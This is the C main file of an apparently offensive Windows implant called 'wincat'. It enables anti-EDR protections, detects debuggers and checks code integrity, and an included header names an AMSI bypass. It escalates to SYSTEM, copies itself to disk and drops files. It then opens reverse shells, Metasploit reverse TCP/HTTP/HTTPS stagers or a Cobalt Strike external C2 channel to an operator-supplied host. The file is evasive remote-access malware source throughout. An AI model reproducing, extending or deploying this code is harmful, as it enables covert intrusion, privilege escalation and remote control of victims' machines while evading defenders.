#include <windows.h>
#include <stdio.h>

#include "MgArguments.h"
#include "Tools.h"
#include "Message.h"

#include "RunAs.h"
#include "GetSystem.h"
#include "PrivEsc.h"

#include "DropFile.h"
#include "CheckSystem.h"

#include "ProtectProcess.h"
#include "EDRChecker.h"
#include "BypassAMSI.h" 

#include "RunShell.h"
#include "ReverseHttp.h"
#include "CustomShell.h"
#include "csExternalC2.h"



#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")


BOOL CopyWinNC(const char* wincatDefaultPath) {
    BOOL retVal = FALSE;
    char* currentFilePath = (char*)calloc(MAX_PATH, 1);
    if (currentFilePath != NULL) {
        if (GetModuleFileNameA(NULL, currentFilePath, MAX_PATH) > 0) {
            if (CopyFileA(currentFilePath, wincatDefaultPath, FALSE))
                retVal = TRUE;
        }
        free(currentFilePath);
    }
    return retVal;
}

int wmain(int argc, WCHAR* argv[]){
    Arguments listAgrument;


    //////////////////// Protect process ///////////////////
    //  (Anti-DLL injection)
    //SetHook();

    if (EnableACG())
        printMsg(STATUS_OK, LEVEL_DEFAULT, "Anti-EDR - ACG enable\n");
    else
        printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Fail to enable ACG\n");

    if (!CheckCodeSection())
        exit(0);

    if (IsDebuggerPresentPEB()) {
        printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Debugger detected");
#if !_DEBUG
        exit(0);
#endif
    } else
        printMsg(STATUS_INFO, LEVEL_VERBOSE, "Check For Debugger[2]: OK\n");

    EDRChecker();

    if(!CheckCodeSection())
        exit(0);
    //
    //////////////////// Protect process ///////////////////



    if (!GetArguments(argc, argv, &listAgrument)) {
        if (IsRunAsAdmin()) {
            if (isArgHostSet()) {
                printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process running with admin priv !\n");
                GetSystem();
            } else if(IsRunAsSystem()){
                if (GetInfoPipeSystem(&listAgrument)){
                    ProtectProcess();
                    initWSAS();
                    RunShell(listAgrument);
                } else{
                    return FALSE;
                }
            }
        }
        return TRUE;
    }
    


    ////////////////////// Copy Wincat /////////////////////
    // 
    if (!IsFileExist((char*)listAgrument.wincatDefaultPath)) {
        if (CreateDirectoryA(listAgrument.wincatDefaultDir, NULL) != ERROR_PATH_NOT_FOUND)
            if (!CopyWinNC(listAgrument.wincatDefaultPath))
                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to copy wincat to '%s'", listAgrument.wincatDefaultPath);
    }
    //
    ////////////////////// Copy Wincat /////////////////////



    if (listAgrument.Detached && argc > 3)
        RunProcessDetached(argc, argv);
    else {
        if (listAgrument.toDROP != Nothing)
            DropFiles(listAgrument.wincatDefaultDir, listAgrument.toDROP);
        if (argc >= 3) {
            if (listAgrument.GetSystem) {
                ProtectProcess();
                PrivEsc(listAgrument);
                return FALSE;
            } else if (initWSAS()) {
                switch (listAgrument.payloadType) {
                case PAYLOAD_RECV_CMD:
                case PAYLOAD_RECV_PS:
                    if (listAgrument.lpszUsername[0] == 0) {
                        ProtectProcess();
                        RunShell(listAgrument);
                    }else
                        RunShellAs(listAgrument);
                    break;
                case PAYLOAD_MSF_RECV_TCP:
                    ProtectProcess();
                    MsfReverseTcp(listAgrument);
                    break;
                case PAYLOAD_MSF_RECV_HTTP:
                    ProtectProcess();
                    StagerReverseHTTP(listAgrument.host, listAgrument.port);
                    break;
                case PAYLOAD_MSF_RECV_HTTPS:
                    ProtectProcess();
                    StagerReverseHTTPS(listAgrument.host, listAgrument.port);
                    break;
                case PAYLOAD_CS_EXTERNAL_C2:
                    ProtectProcess();
                    csExternalC2(listAgrument.host, listAgrument.port);
                    break;
                case PAYLOAD_CUSTOM_SHELL:
                    ProtectProcess();
                    CustomShell(listAgrument.host, listAgrument.port);
                    break;
                default:
                    printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Argument error");
                    break;
                }
                WSACleanup();
            } else
                return TRUE;            
        }
    }
    return FALSE;
}

